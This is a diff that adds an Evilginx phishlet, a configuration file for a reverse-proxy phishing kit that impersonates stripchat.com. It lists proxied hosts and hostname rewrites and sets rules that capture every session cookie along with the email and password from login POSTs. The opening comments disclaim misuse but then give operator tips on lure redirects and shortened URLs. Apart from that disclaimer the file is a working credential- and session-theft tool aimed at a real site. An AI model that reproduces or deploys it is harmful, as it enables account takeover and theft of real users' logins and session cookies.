@@ -1,0 +1,75 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+# Don't Forget To set "next_lure" Params to your second lure ( Just to redirect user on failed captcha)
+
+# Use This Command To set the domain params from the evilginx command line.
+# Where ID is lure id number, and  "https://mylure.com/tyghh" is the another lure of evilginx for same phishlet.
+# Use shortened URL from the another lure , And then add that shortened url as "next_lure" parameter
+# lures edit params ID next_lure=https://mylure.com/tyghh
+ 
+#Always use shortned url's to add in redirect_url in lures, ( There is a login issue in evilginx, Which sometime fails to redirect if you uses same domain as in hosts list, So use shortened urls of your redirect path)
+
+author: '@mansteve'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'stripchat.com', session: true, is_landing: true}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'stripchat.com', session: true, is_landing: false}
+
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'amplitude.com', session: false, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'amplitude.com', session: false, is_landing: false}
+  - {phish_sub: 'go', orig_sub: 'go', domain: 'xxviiijmp.com', session: false, is_landing: false}
+  - {phish_sub: 'go', orig_sub: 'go', domain: 'stripchat.com', session: false, is_landing: false}
+  - {phish_sub: 'sentry-public', orig_sub: 'sentry-public', domain: 'stripchat.com', session: false, is_landing: false}
+  - {phish_sub: 'websocket', orig_sub: 'websocket', domain: 'stripchat.com', session: false, is_landing: false}
+  
+
+
+
+
+sub_filters:
+  - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: '', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'assets', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'assets', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'assets', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+  - {triggers_on: 'stripchat.com', orig_sub: 'api', domain: 'amplitude.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'api', domain: 'amplitude.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'api', domain: 'amplitude.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'xxviiijmp', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'xxviiijmp', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'xxviijmp', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'go', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'sentry-public', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'sentry-public', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'sentry-public', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'websocket', domain: 'stripchat.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'websocket', domain: 'stripchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'stripchat.com', orig_sub: 'websocket', domain: 'stripchat.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+auth_tokens:
+  - domain: '.stripchat.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/login/.*'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'    
+login:
+  domain: 'www.stripchat.com'
+  path: '/login'
+    
+
+
+  
